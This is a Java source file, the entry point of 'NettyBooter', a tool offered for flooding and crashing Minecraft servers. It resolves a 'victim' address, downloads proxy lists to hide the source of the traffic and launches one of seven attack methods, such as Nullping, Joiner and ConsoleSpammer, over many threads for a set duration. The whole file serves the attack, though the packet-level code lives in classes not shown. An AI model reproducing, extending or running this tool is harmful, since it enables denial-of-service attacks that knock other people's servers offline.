package me.nzxtercode.nettybooter;

import java.io.File;
import java.io.PrintStream;
import java.net.InetAddress;
import java.util.Scanner;

import me.nzxtercode.nettybooter.methods.Methods;
import me.nzxtercode.nettybooter.methods.interfaces.IMethod;
import me.nzxtercode.nettybooter.packets.Handshake;
import me.nzxtercode.nettybooter.packets.ServerAddress;
import me.nzxtercode.nettybooter.proxy.ProxyLoader;
import me.nzxtercode.nettybooter.utils.LinuxColors;
import me.nzxtercode.nettybooter.utils.Manager;
import me.nzxtercode.nettybooter.utils.NettyBootstrap;

/**
 * The type Netty booter.
 */
public class NettyBooter {

	public static NettyBooter service;

	private final static ProxyLoader proxyLoader = new ProxyLoader();
	private final static Manager license = new Manager();
	private final static ServerAddress serverAddress = new ServerAddress();

	private static Methods methods;
	/**
	 * The constant threads.
	 */
	public static int threads;
	/**
	 * The constant methodID.
	 */
	public static int methodID;
	/**
	 * The constant protocolID.
	 */
	public static int protocolID;
	/**
	 * The constant port.
	 */
	public static int port;
	/**
	 * The constant duration.
	 */
	public static int duration;
	/**
	 * The constant method.
	 */
	public static IMethod method;
	/**
	 * The constant srvRecord.
	 */
	public static String srvRecord;
	/**
	 * The constant resolved.
	 */
	public static InetAddress resolved;
	/**
	 * The constant proxyType.
	 */
	public static byte proxyType = 0;
	/**
	 * The constant proxyFile.
	 */
	public static File proxyFile;

	/**
	 * The Rainbow.
	 */
	final static boolean RAINBOW = Boolean.parseBoolean(System.getProperty("r", "false"));

	/**
	 * The entry point of application.
	 *
	 * @param args the input arguments
	 * @throws Throwable the throwable
	 */
	 public static void main(String[] args) throws Throwable {
		System.setOut(new PrintStream(System.out) {
			public void println(String x) {
				if (RAINBOW && LinuxColors.EMPTY.support) {
					char[] arr = x.toCharArray();
					StringBuilder sb = new StringBuilder();
					byte b;
					int i;
					char[] arrayOfChar1;
					for (i = (arrayOfChar1 = arr).length, b = 0; b < i;) {
						char c = arrayOfChar1[b];
						sb.append(LinuxColors.EMPTY.getRandomColor());
						sb.append(c);
						b++;
					}
					super.println(sb);
					return;
				}
				super.println(LinuxColors.EMPTY.support ? (LinuxColors.EMPTY.getRandomColor() + x) : x);
			}
		});

		license.start();

		if (args.length != 5 && args.length != 7) {
			System.err.println("NettyBooter b7 v2 ALPHA by NZXTERCODE | https://dsc.gg/nzxterdc");
			System.err.println();
			System.err.println("java (-Dperdelay=2500 -Ddelay=1 -Drmnwp=false) -jar "
					+ (new File(NettyBooter.class.getProtectionDomain().getCodeSource().getLocation().toURI()))
					.getName()
					+ " 0:25565 (Method-ID) (Thread-Count) (Protocol-Version) (Duration) [(ProxyFile) (Proxy-Type)]");
			System.err
					.println("java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar "
							+ (new File(NettyBooter.class.getProtectionDomain().getCodeSource().getLocation().toURI()))
							.getName()
							+ " example.net/0:25565 1-7 5 47 60 socks4_proxies.txt http/socks4/socks5");
			System.err.println();
			System.err.println("Methods: 7");
			System.err.println();
			System.err.println("** BungeeCord **");
			System.err.println("1. Pinger");
			System.err.println("2. QuitExceptions");
			System.err.println("3. RandomExceptions");
			System.err.println("4. PacketOutOfRange");
			System.err.println();
			System.err.println("** BungeeCord/Spigot **");
			System.err.println("5. Joiner");
			System.err.println("6. Nullping");
			System.err.println("7. ConsoleSpammer");
			return;
		}
		if (cantParseInt(args[1]) || cantParseInt(args[2]) || cantParseInt(args[3]) || cantParseInt(args[4])) {
			System.err.println("Usage: java (-Dperdelay=2500 -Ddelay=1 -Drmnwp=false -Dr=true) -jar "
					+ (new File(NettyBooter.class.getProtectionDomain().getCodeSource().getLocation().toURI()))
					.getName()
					+ " 0:25565 (Method-ID) (Thread-Count) (Protocol-Version) (Duration) [(ProxyFile) (Proxy-Type)]");
			return;
		}
		if (args.length == 7) {
			if (!args[6].equalsIgnoreCase("http") && !args[6].equalsIgnoreCase("socks4")
					&& !args[6].equalsIgnoreCase("socks5")) {
				System.err.println("Usage: java (-Dperdelay=2500 -Ddelay=1 -Drmnwp=false -Dr=true) -jar "
						+ (new File(NettyBooter.class.getProtectionDomain().getCodeSource().getLocation().toURI()))
						.getName()
						+ " 0:25565 (Method-ID) (Thread-Count) (Protocol-Version) (Duration) [(ProxyFile) (Proxy-Type)]");
				return;
			}
			if (!(new File(args[5])).exists()) {
				System.err.println("The proxie file not exist");
				System.err.println("Download proxies...");
				proxyLoader.load();
				System.err.println("Downloaded!");
				return;
			}
		}
		try {
			System.err.println("Download proxies...");
			proxyLoader.load();
			System.err.println("Downloaded!");
			System.out.println("Looking up the target address...");
			ServerAddress sa = serverAddress.getAddress(args[0]);
			srvRecord = sa.getIP();
			port = sa.getPort();
			System.out.println("Found victim with " + srvRecord + ":" + port);
			resolved = InetAddress.getByName(srvRecord);
			System.out.println("The victims ip-address is " + resolved.getHostAddress());
			methodID = Integer.parseInt(args[1]);
			threads = Integer.parseInt(args[2]);
			protocolID = Integer.parseInt(args[3]);
			duration = Integer.parseInt(args[4]);
			if (args.length == 7) {
				proxyFile = new File(args[5]);
				if (!proxyFile.exists()) {
					System.err.println("The proxy file you wanna use dosen't exist");
					return;
				}
				if (args[6].equalsIgnoreCase("http")) {
					System.out.println("Selected http proxies");
					proxyType = 3;
				} else if (args[6].equalsIgnoreCase("socks4")) {
					System.out.println("Selected socks4 proxies");
					proxyType = 2;
				} else if (args[6].equalsIgnoreCase("socks5")) {
					proxyType = 1;
					System.out.println("Selected socks5 proxies");
				} else {
					System.err.println("Invalid proxy type");
					return;
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
			Thread.sleep(5000L);
			return;
		}
		(new Thread(() -> {
			Scanner scanner = new Scanner(System.in);
			String msg = "";
			do {
				msg = scanner.next().toLowerCase();
			} while (!msg.equals("bb") && !msg.equals("b") && !msg.equals("end") && !msg.equals("stop")
					&& !msg.equals("close") && !msg.equals("c"));
			scanner.close();
			System.out.println(
					LinuxColors.EMPTY.support ? "\033[1;31mShutting down the attack!\nBB" : "Shutting down the attack!\nBB");
			System.exit(0);
		})).start();
		methods = new Methods(new Handshake(NettyBooter.protocolID, NettyBooter.srvRecord, NettyBooter.port, 2));
		methods.init();
		method = methods.getByID(methodID);
		new NettyBootstrap().start();
	}

	/**
	 * Cant parse int boolean.
	 *
	 * @param bert the bert
	 * @return the boolean
	 */
	static boolean cantParseInt(String bert) {
		try {
			Integer.parseInt(bert);
			return false;
		} catch (Exception e) {
			return true;
		}
	}
}
